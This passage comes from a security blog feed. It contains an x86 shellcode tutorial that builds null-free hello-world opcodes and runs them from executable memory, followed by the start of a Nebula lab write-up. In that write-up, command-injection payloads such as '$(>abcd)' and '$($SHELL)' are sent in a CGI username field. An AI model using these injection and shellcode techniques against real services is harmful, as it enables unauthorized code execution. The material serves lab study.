</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d hello1 -M intel
</span><span class='line'>
</span><span class='line'>hello1:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048080 &lt;_start>:
</span><span class='line'> 8048080: b8 04 00 00 00          mov    eax,0x4
</span><span class='line'> 8048085: bb 01 00 00 00          mov    ebx,0x1
</span><span class='line'> 804808a: b9 a4 90 04 08          mov    ecx,0x80490a4
</span><span class='line'> 804808f: ba 06 00 00 00          mov    edx,0x6
</span><span class='line'> 8048094: cd 80                   int    0x80
</span><span class='line'> 8048096: b8 01 00 00 00          mov    eax,0x1
</span><span class='line'> 804809b: bb 00 00 00 00          mov    ebx,0x0
</span><span class='line'> 80480a0: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>When we set 32b register with a small value, the compiler fills the unused
space with zeros.  Instead, we should use AX = 16b or AL = 8b register parts
(in the case of register EAX).</p>

<p>Next try:</p>

<figure class='code'><figcaption><span>hello2.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">msg</span> <span class="no">db</span> <span class="err">&#39;</span><span class="no">hello</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0xa</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">msg</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">6</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span><span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello2.asm; ld hello2.o -o hello2
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./hello2 
</span><span class='line'>hello
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# objdump -d hello2 -M intel
</span><span class='line'>
</span><span class='line'>hello2:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048080 &lt;_start>:
</span><span class='line'> 8048080: b0 04                   mov    al,0x4
</span><span class='line'> 8048082: b3 01                   mov    bl,0x1
</span><span class='line'> 8048084: b9 94 90 04 08          mov    ecx,0x8049094
</span><span class='line'> 8048089: b2 06                   mov    dl,0x6
</span><span class='line'> 804808b: cd 80                   int    0x80
</span><span class='line'> 804808d: b0 01                   mov    al,0x1
</span><span class='line'> 804808f: b3 00                   mov    bl,0x0
</span><span class='line'> 8048091: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>We attempt to make the code position independent pushing string to the stack:</p>

<figure class='code'><figcaption><span>hello3.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">clear</span> <span class="no">out</span> <span class="no">the</span> <span class="no">registers</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">need</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nf">push</span> <span class="mi">0x58580a6f</span> <span class="err">;</span> <span class="no">push</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="err">\</span><span class="no">n</span><span class="p">,</span> <span class="no">o</span>
</span><span class='line'><span class="nf">push</span> <span class="mi">0x6c6c6568</span> <span class="err">;</span> <span class="no">push</span> <span class="no">l</span><span class="p">,</span> <span class="no">l</span><span class="p">,</span> <span class="no">e</span><span class="p">,</span> <span class="no">h</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">6</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello3.asm; ld hello3.o -o hello3
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./hello3 
</span><span class='line'>hello
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# objdump -d hello3 -M intel
</span><span class='line'>
</span><span class='line'>hello3:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 31 c0                   xor    eax,eax
</span><span class='line'> 8048062: 31 db                   xor    ebx,ebx
</span><span class='line'> 8048064: 31 c9                   xor    ecx,ecx
</span><span class='line'> 8048066: 31 d2                   xor    edx,edx
</span><span class='line'> 8048068: b0 04                   mov    al,0x4
</span><span class='line'> 804806a: b3 01                   mov    bl,0x1
</span><span class='line'> 804806c: 68 6f 0a 58 58          push   0x58580a6f
</span><span class='line'> 8048071: 68 68 65 6c 6c          push   0x6c6c6568
</span><span class='line'> 8048076: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048078: b2 06                   mov    dl,0x6
</span><span class='line'> 804807a: cd 80                   int    0x80
</span><span class='line'> 804807c: b0 01                   mov    al,0x1
</span><span class='line'> 804807e: 31 db                   xor    ebx,ebx
</span><span class='line'> 8048080: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>Now it looks good, but the 0x0a could sometimes terminate the buffer
prematurely, so we simply do not use this character.</p>

<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">clear</span> <span class="no">out</span> <span class="no">the</span> <span class="no">registers</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">need</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nf">push</span> <span class="mi">0x5858586f</span> <span class="err">;</span> <span class="no">push</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="no">o</span>
</span><span class='line'><span class="nf">push</span> <span class="mi">0x6c6c6568</span> <span class="err">;</span> <span class="no">push</span> <span class="no">l</span><span class="p">,</span> <span class="no">l</span><span class="p">,</span> <span class="no">e</span><span class="p">,</span> <span class="no">h</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">5</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello4.asm; ld hello4.o -o hello4
</span><span class='line'>root@kali32:/tmp# ./hello4 
</span><span class='line'>hello
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# objdump -d hello4 -M intel
</span><span class='line'>
</span><span class='line'>hello4:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 31 c0                   xor    eax,eax
</span><span class='line'> 8048062: 31 db                   xor    ebx,ebx
</span><span class='line'> 8048064: 31 c9                   xor    ecx,ecx
</span><span class='line'> 8048066: 31 d2                   xor    edx,edx
</span><span class='line'> 8048068: b0 04                   mov    al,0x4
</span><span class='line'> 804806a: b3 01                   mov    bl,0x1
</span><span class='line'> 804806c: 68 6f 58 58 58          push   0x5858586f
</span><span class='line'> 8048071: 68 68 65 6c 6c          push   0x6c6c6568
</span><span class='line'> 8048076: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048078: b2 05                   mov    dl,0x5
</span><span class='line'> 804807a: cd 80                   int    0x80
</span><span class='line'> 804807c: b0 01                   mov    al,0x1
</span><span class='line'> 804807e: 31 db                   xor    ebx,ebx
</span><span class='line'> 8048080: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>Now we parse out the opcodes and validate the functionality.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d hello4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
</span><span class='line'>\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80</span></code></pre></td></tr></table></div></figure>


<p>If we want to store shellcode to the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d hello4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > hello.shellcode
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# hexdump -C hello.shellcode 
</span><span class='line'>00000000  31 c0 31 db 31 c9 31 d2  b0 04 b3 01 68 6f 58 58  |1.1.1.1.....hoXX|
</span><span class='line'>00000010  58 68 68 65 6c 6c 89 e1  b2 05 cd 80 b0 01 31 db  |Xhhell........1.|
</span><span class='line'>00000020  cd 80                                             |..|
</span><span class='line'>00000022</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>test.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./test 
</span><span class='line'>allocated executable memory at: 0xb7734000
</span><span class='line'>hello</span></code></pre></td></tr></table></div></figure>


<p>Our next step will be to execute shell.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (16-19)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19/"/>
    <updated>2015-06-20T11:51:41+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/20/exploit-exercises-nebula-16-19</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level16</h2>

<p>There is a perl script running on port 1616, source:</p>

<figure class='code'><figcaption><span>index.pl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/env perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login was accepted&lt;br/&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login failed&lt;br/&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">htmlz</span><span class="p">(</span><span class="n">login</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">),</span> <span class="n">param</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">)));</span>
</span></code></pre></td></tr></table></div></figure>


<p>The service is running with flag16 privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ps auxww | grep [f]lag16
</span><span class='line'>flag16    1314  0.0  0.3   2592   836 ?        Ss   Jun18   0:01 /usr/sbin/thttpd -C /home/flag16/thttpd.conf</span></code></pre></td></tr></table></div></figure>


<p>Clearly, there is RCE vulnerability (line 14), we can check it creating an arbitrary file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ wget -q -O /dev/null "http://192.168.80.136:1616/index.cgi?username=%24(>abcd)&password=x" 
</span><span class='line'>
</span><span class='line'>sh-4.2$ ls -l /home/flag16/ABCD 
</span><span class='line'>-rw-rw-r-- 1 flag16 flag16 0 2015-06-21 00:16 /home/flag16/ABCD</span></code></pre></td></tr></table></div></figure>


<p>Only problem is that input is uppercased and everything after whitespace character is stripped:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>    <span class="c1"># strip everything after a space</span>
</span></code></pre></td></tr></table></div></figure>


<p>We tried several other methods without success. In the later case, the shell runs, but we cannot do anything useful:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.136:1616/index.cgi?username=$(CMD=YES;${CMD~~})&password
</span><span class='line'>http://192.168.80.136:1616/index.cgi?username=$($SHELL)&password</span></code></pre></td></tr></table></div></figure>


<p>Our solution was to create uppercased file in /tmp/ and use * expansion, telling bash to find the correct directory.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat SH 
